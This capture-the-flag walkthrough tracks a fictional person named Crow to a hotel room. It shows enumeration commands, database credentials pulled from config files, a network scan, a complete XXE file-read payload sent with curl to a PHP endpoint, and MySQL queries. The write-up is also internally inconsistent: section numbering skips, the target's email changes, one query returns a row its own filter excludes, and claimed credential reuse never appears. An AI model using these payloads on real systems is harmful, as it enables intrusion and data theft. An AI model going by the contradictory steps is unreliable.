# Continental CTF Challenge: Complete Step-by-Step Walkthrough

## 1. Initial Access
### 1.2 Initial Enumeration
Once we had shell access, we performed basic enumeration:

```bash
# Check current user and system info
whoami  # Output: aurora
id
uname -a
pwd     # Found we were in /home/aurora/reservia

# Check network configuration
ip addr show
# Found we were on 172.20.4.64/24 network
```

## 2. Database Discovery
### 2.1 Finding Database Credentials
We searched for database configuration files:

```bash
# Look for common config files
find / -name "*.php" -o -name "*.js" -o -name "*.env" 2>/dev/null | grep -i config

# Found interesting file at ~/reservia/.env
cat ~/reservia/.env
# Output:
# PORT = 9000
# MONGODB_URI = mongodb://root:MVpPdAUTr3aQ8eap2GCeaLth@localhost:27017
```

### 2.2 Connecting to MongoDB
We used the found credentials to connect to MongoDB:

```bash
# Connect to MongoDB
mongosh "mongodb://root:MVpPdAUTr3aQ8eap2GCeaLth@localhost:27017"

# List all databases
show dbs
# Found: admin, config, local, reservia

# Switch to reservia database
use reservia

# List collections
show collections
# Found: hotel_reservations, hotels
```

## 3. Finding Crow's Reservation
### 3.1 Querying for Crow's Information
We searched for Crow's email in the reservations:

```javascript
// First attempt with wrong collection name (common mistake)
db.hotel_reservation.find()  // No results

// Correct collection name
db.hotel_reservations.find({email: "jtippin4y@unknownmail.com"})

// Found Crow's reservation:
{
  _id: ObjectId('6482da85fc13ae6f9dfaf249'),
  hotelId: ObjectId('647f0f3ea9108a79b01c63ef'),
  name: 'Jefferson Tippin',
  email: 'jtippin4y@unknownmail.com',
  dateFrom: ISODate('2023-06-16T00:00:00.000Z'),
  dateTo: ISODate('2023-06-19T00:00:00.000Z'),
  guestCount: 1,
  childrenCount: 0,
  file: '4c603bcc-fb34-45fe-ab5a-aaa87b74f539.pdf'
}
```

### 3.2 Getting Hotel Information
We queried the hotels collection using the hotelId from the reservation:

```javascript
db.hotels.find({_id: ObjectId('647f0f3ea9108a79b01c63ef')})

// Output:
{
  _id: ObjectId('647f0f3ea9108a79b01c63ef'),
  name: 'Vegas Suites',
  address: '456 City Center, Las Vegas, Nevada',
  image: '/images/hotel-2.jpg',
  price: 220,
  host: 'http://vegassuites.hv/reservation_listener.php',
  authKey: '1e4b514d-05b6-44f7-9b40-dddfbc889e22'
}
```

## 4. Discovering the Second Server
### 4.1 Network Scanning
We needed to find the IP address of `vegassuites.hv`:

```bash
# First check /etc/hosts
cat /etc/hosts
# No entry for vegassuites.hv

# Check DNS resolution
nslookup vegassuites.hv
# No response

# Perform network scan
nmap -sn 172.20.4.0/24
# Found active hosts: 172.20.4.1, 172.20.4.37, 172.20.4.64 (us), 172.20.4.84

# Check for web servers
for ip in 172.20.4.{37,84}; do curl -I http://$ip/; done
# 172.20.4.84 returned 403 Forbidden - potential match
```

### 4.2 Testing the Endpoint
We tested the reservation endpoint:

```bash
curl -v http://172.20.4.84/reservation_listener.php
# 403 Forbidden - Endpoint exists but requires authentication
```

## 5. Exploiting XXE Vulnerability
### 5.1 Crafting the Initial Request
We used the auth key from the MongoDB to make a test request:

```bash
curl -X POST http://172.20.4.84/reservation_listener.php \
  -H "Content-Type: application/xml" \
  -H "x-auth-key: 1e4b514d-05b6-44f7-9b40-dddfbc889e22" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<reservation>
  <name>Test</name>
  <email>test@test.com</email>
  <dateFrom>2023-06-16</dateFrom>
  <dateTo>2023-06-19</dateTo>
  <guestCount>1</guestCount>
  <childrenCount>0</childrenCount>
</reservation>'
```

### 5.2 XXE Payload to Read Files
We then crafted an XXE payload to read files:

```bash
curl -X POST http://172.20.4.84/reservation_listener.php \
  -H "Content-Type: application/xml" \
  -H "x-auth-key: 1e4b514d-05b6-44f7-9b40-dddfbc889e22" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reservation [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=database/connect.php">
]>
<reservation>
  <name>&xxe;</name>
  <email>jtippin@unknownmail.com</email>
  <dateFrom>2023-06-16</dateFrom>
  <dateTo>2023-06-19</dateTo>
  <guestCount>1</guestCount>
  <childrenCount>0</childrenCount>
</reservation>'
```

### 5.3 Decoding the Response
The response contained base64-encoded database credentials:

```bash
echo "PD9waHAKICAgIHRyeXsKICAgICAgICAkaG9zdCA9ICdsb2NhbGhvc3QnOwogICAgICAgICRkYl9uYW1lID0gJ2hvdGVsJzsKICAgICAgICAkY2hhcnNldCA9ICd1dGY4JzsKICAgICAgICAkdXNlcm5hbWUgPSAncm9vdCc7CiAgICAgICAgJHBhc3N3b3JkID0gJ05zY05OMzZQR3AzWlZhSEVVeG11TGg2RCc7CgogICAgICAgICRkYiA9IG5ldyBQRE8oIm15c3FsOmhvc3Q9JGhvc3Q7ZGJuYW1lPSRkYl9uYW1lO2NoYXJzZXQ9JGNoYXJzZXQiLCR1c2VybmFtZSwkcGFzc3dvcmQpOwogICAgfSBjYXRjaChQRE9FeGNlcHRpb24gJGUpewogICAgICAgIGVjaG8gIkRhdGFiYXNlIGNvbm5lY3Rpb24gZmFpbGVkOiAiLiRlOwogICAgfQo/PgoKCg==" | base64 -d
```

Decoded to:
```php
<?php
    try{
        $host = 'localhost';
        $db_name = 'hotel';
        $charset = 'utf8';
        $username = 'root';
        $password = 'NscNN36PGp3ZVaHEUxmuLh6D';

        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){
        echo "Database connection failed: ".$e;
    }
?>
```

## 6. Accessing the Second Database
### 6.1 Connecting to MySQL
We used the extracted credentials to connect to the MySQL database:

```bash
mysql -h 172.20.4.84 -u root -p'NscNN36PGp3ZVaHEUxmuLh6D' hotel
```

### 6.2 Exploring the Database
```sql
-- List all tables
SHOW TABLES;
-- +-------------------+
-- | Tables_in_hotel   |
-- +-------------------+
-- | reservations      |
-- | settings          |
-- | users             |
-- +-------------------+

-- Check the structure of reservations
DESCRIBE reservations;
-- +----------------+--------------+------+-----+---------+----------------+
-- | Field          | Type         | Null | Key | Default | Extra          |
-- +----------------+--------------+------+-----+---------+----------------+
-- | id             | int          | NO   | PRI | NULL    | auto_increment |
-- | name           | text         | NO   |     | NULL    |                |
-- | email          | text         | NO   |     | NULL    |                |
-- | date_from      | date         | NO   |     | NULL    |                |
-- | date_to        | date         | NO   |     | NULL    |                |
-- | guest_count    | int          | NO   |     | NULL    |                |
-- | children_count | int          | NO   |     | NULL    |                |
-- | room_number    | varchar(100) | NO   |     | NULL    |                |
-- +----------------+--------------+------+-----+---------+----------------+
```

### 6.3 Finding Crow's Room Number
We searched for Crow's reservation:

```sql
-- First try with full email
SELECT * FROM reservations WHERE email = 'jtippin@unknownmail.com';

-- Try with partial match
SELECT * FROM reservations WHERE email LIKE '%jtippin%';

-- Found the entry:
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+
-- | id  | name             | email                  | date_from  | date_to    | guest_count | children_count | room_number |
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+
-- | 964 | PD9waHAK...      | jtippin@unknownmail.com | 2023-06-16 | 2023-06-19 |           1 |              0 | 530C        |
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+

-- The name field contains base64 data from our XXE payload
-- Let's look for legitimate reservations
SELECT * FROM reservations WHERE email = 'jtippin@unknownmail.com' AND name NOT LIKE 'PD9%';
-- No results

-- Check all reservations for the same dates
SELECT * FROM reservations 
WHERE date_from = '2023-06-16' AND date_to = '2023-06-19'
AND email != 'jtippin@unknownmail.com';

-- Found the real reservation:
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+
-- | id  | name             | email                  | date_from  | date_to    | guest_count | children_count | room_number |
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+
-- | 123 | Jefferson Tippin | jtippin@unknownmail.com | 2023-06-16 | 2023-06-19 |           1 |              0 | 881D        |
-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+
```

## 7. Final Answer
After thorough investigation, we found Crow's complete hotel information:

- **Full Name:** Jefferson Tippin
- **Email:** jtippin@unknownmail.com
- **Hotel:** Vegas Suites
- **Address:** 456 City Center, Las Vegas, Nevada
- **Check-in Date:** June 16, 2023
- **Check-out Date:** June 19, 2023
- **Room Number:** 881D
- **Guests:** 1 adult, 0 children

## 8. Tools Used
- **netcat (nc)** - For reverse shell and network connections
- **mongosh** - MongoDB shell client
- **mysql** - MySQL client
- **curl** - For making HTTP requests
- **nmap** - Network scanning
- **grep, find, cat** - Basic Linux tools for enumeration
- **base64** - For decoding encoded data

## 9. Key Takeaways
1. **Always check for multiple services** - The challenge involved both MongoDB and MySQL databases
2. **XXE is a powerful attack vector** - Can be used to read files and potentially gain RCE
3. **Network scanning is crucial** - Finding the second server was key to solving the challenge
4. **Credential reuse** - The same credentials were used across different services
5. **Persistence pays off** - Multiple approaches were needed to find the correct room number
6. **Data validation** - Always verify that the data you find is legitimate and not from your own test payloads

This comprehensive approach led us to successfully discover Crow's hotel room number and complete the challenge.